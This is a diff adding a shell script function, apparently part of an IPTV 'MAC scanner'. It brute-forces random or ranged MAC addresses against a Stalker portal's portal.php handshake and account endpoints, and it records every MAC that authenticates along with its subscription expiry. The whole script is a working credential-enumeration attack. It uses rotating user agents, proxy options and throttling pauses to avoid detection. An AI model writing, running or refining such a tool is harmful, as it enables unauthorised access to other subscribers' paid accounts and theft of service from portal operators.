@@ -1,0 +1,55 @@
+#!/bin/sh
+
+handshaking() {
+	if [[ -n ${last_request_timedout} ]]; then
+		unset last_request_timedout
+	else
+		item=$(( $item + 1 ))
+		[[ -n ${stopping} ]] && [[ $(( $item - 1 )) == $stopping ]] && \
+			( [[ -n ${only_outputs_mac} ]] || \
+			echo ${_BOLD}${_CYAN}"$(( $item - 1 )) checked, $valid_macs_number valid. Stopping."${_RESET} ) && \
+			exit 0
+		[[ $item == 1 ]] || ( [[ ${timebreak} -ne 0 ]] && \
+			[[ $(expr $(( $item - 1 )) % $timebreak ) == 0 ]] && \
+			( [[ -n ${only_outputs_mac} ]] || echo -ne ${_BLUE}"\r[$(( $item - 1 ))] $mac ${_RESET}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET} ) && \
+			sleep $timebreak_duration ) || \
+			sleep $request_delay
+		[[ -n ${range} ]] && range_mac
+		[[ -z ${range+x} ]] && random_mac
+	fi
+	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
+	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
+	random_user_agent
+	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then timeout_number=$(( $timeout_number + 1 )) && last_request_timedout=true && ( [[ -n ${only_outputs_mac} ]] || echo -ne "${_ERASE}Timeout [$timeout_number]. New attempt in $timebreak_duration seconds." ) && sleep $timebreak_duration && ( [[ -n ${only_outputs_mac} ]] || echo -ne "${_ERASE}${_ERASE}New attempt..." ) && return; fi
+	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')
+	[[ $handshake_token = "" ]] && ( [[ -n ${only_outputs_mac} ]] || echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
+	[[ $(echo $handshake_token | grep null) ]] && ( [[ -n ${only_outputs_mac} ]] || echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
+	authorization='Bearer '$(echo $handshake_token)
+	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
+	profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
+	[[ $profile == "" ]] && \
+		maybeGEN1portal=true && \
+		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac) && \
+		profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
+		[[ $profile == "" ]] && unset maybeGEN1portal && ( [[ -n ${only_outputs_mac} ]] || echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # test
+	[[ -z ${maybeGEN1portal+x} ]] && \
+		account_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac) && \
+		account=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $account_url)") && \
+		[[ ! $account == "" ]] && \
+		profile=$account
+	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')
+	[[ -z ${expiration_date} && -z ${keep_expired+x} ]] && \
+		( [[ -n ${only_outputs_mac} ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" ) && \
+		return
+	[[ -z ${expiration_date} && -n ${keep_expired} ]] && \
+		( [[ -n ${only_outputs_mac} ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" ) && \
+		( if [[ $valid_macs_number == 0 ]]; then echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name; fi ) && \
+		echo "$mac [expired]" >> $destination/valid_macs_$name && \
+		return
+	[[ $valid_macs_number == 0 ]] && echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
+	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
+	( ( [[ -n ${only_outputs_mac} ]] && echo $mac ) || \
+		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n" )
+	valid_macs_number=$(( $valid_macs_number + 1 ))
+	unset maybeGEN1portal
+}
